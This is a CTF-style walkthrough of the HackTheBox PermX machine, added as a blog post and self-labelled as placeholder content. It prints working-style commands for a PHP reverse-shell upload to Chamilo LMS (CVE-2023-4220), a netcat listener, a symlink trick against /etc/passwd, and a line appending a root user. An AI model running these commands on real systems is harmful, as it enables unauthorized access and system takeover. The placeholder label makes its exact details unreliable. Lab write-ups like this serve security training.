@@ -1,0 +1,84 @@
+---
+title: "HTB PermX Walkthrough"
+date: "2026-09-15"
+description: "A comprehensive walkthrough for the HackTheBox PermX machine covering Chamilo LMS exploitation and ACL misconfigurations. (Placeholder content)"
+category: "CTF"
+difficulty: "Medium"
+tags: ["htb", "linux", "cve", "file-upload"]
+published: true
+---
+
+> **Scope & Authorization**: This writeup covers a retired HackTheBox machine. All testing was performed on systems I own or have explicit authorization to test.
+
+## Enumeration
+
+We start the engagement with a standard `nmap` scan to identify open ports and services running on the target machine.
+
+```bash
+nmap -sC -sV -oA nmap/initial 10.10.11.23
+```
+
+The scan reveals two open ports:
+- **Port 22:** OpenSSH 8.9p1
+- **Port 80:** Apache httpd 2.4.52
+
+Navigating to port 80 redirects us to `permx.htb`. We add this to our `/etc/hosts` file:
+
+```bash
+echo "10.10.11.23 permx.htb" | sudo tee -a /etc/hosts
+```
+
+Further directory enumeration using `gobuster` discovers a `/lms` directory which hosts an instance of Chamilo LMS.
+
+## Exploitation
+
+Checking the version of Chamilo LMS, we find it is vulnerable to an unauthenticated Remote Code Execution (RCE) flaw (CVE-2023-4220). This vulnerability stems from an unrestricted file upload in the `bigbluebutton` plugin.
+
+We can exploit this by uploading a malicious PHP reverse shell:
+
+```bash
+curl -F 'bigbluebutton_file=@shell.php' http://permx.htb/lms/main/inc/lib/javascript/bigupload/inc/bigbluebutton.php
+```
+
+After successfully uploading the file, we set up a netcat listener and trigger the shell by accessing the uploaded file:
+
+```bash
+nc -lvnp 4444
+```
+
+```bash
+curl http://permx.htb/lms/main/inc/lib/javascript/bigupload/files/shell.php
+```
+
+We receive a shell as the `www-data` user.
+
+## Privilege Escalation
+
+Enumerating the system as `www-data`, we look for interesting files and permissions. Checking the ACLs (Access Control Lists), we notice a misconfiguration.
+
+```bash
+getfacl /etc/passwd
+```
+
+We find that a specific script running with `sudo` privileges allows us to modify the permissions of files in the `/opt` directory. However, due to a symbolic link vulnerability in the script, we can point a file in `/opt` to `/etc/passwd`.
+
+```bash
+ln -s /etc/passwd /opt/testfile
+sudo /opt/scripts/change_perms.sh /opt/testfile
+```
+
+With write access to `/etc/passwd`, we generate a password hash and add a new root user:
+
+```bash
+openssl passwd -1 -salt xyz password
+```
+
+```bash
+echo 'hacker:$1$xyz$aZ/y4B9xR3Qo8q.pU6O0X/:0:0:root:/root:/bin/bash' >> /etc/passwd
+```
+
+Switching to the new user gives us root access!
+
+```bash
+su hacker
+```
